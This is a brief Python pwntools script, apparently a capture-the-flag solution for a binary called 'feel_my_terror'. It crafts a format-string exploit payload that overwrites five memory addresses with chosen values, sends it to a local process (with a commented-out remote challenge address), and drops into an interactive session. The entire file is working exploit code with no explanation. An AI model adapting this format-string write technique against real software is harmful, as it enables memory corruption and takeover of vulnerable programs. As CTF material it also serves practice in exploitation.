from pwn import *
p=process("feel_my_terror")
# p=remote("154.57.164.70",30274)
e=context.binary=ELF("feel_my_terror")

offset = 6

def u32(x):
    return x & 0xffffffff

writes = {
    0x40402c: u32(-0x21524111),
    0x404034: 0x1337c0de,
    0x40403c: u32(-0xcc84542),
    0x404044: 0x1337f337,
    0x40404c: u32(-0x5211113),
}

payload = fmtstr_payload(
    offset,
    writes,
    write_size='short'
)
p.sendline(payload)
p.interactive()
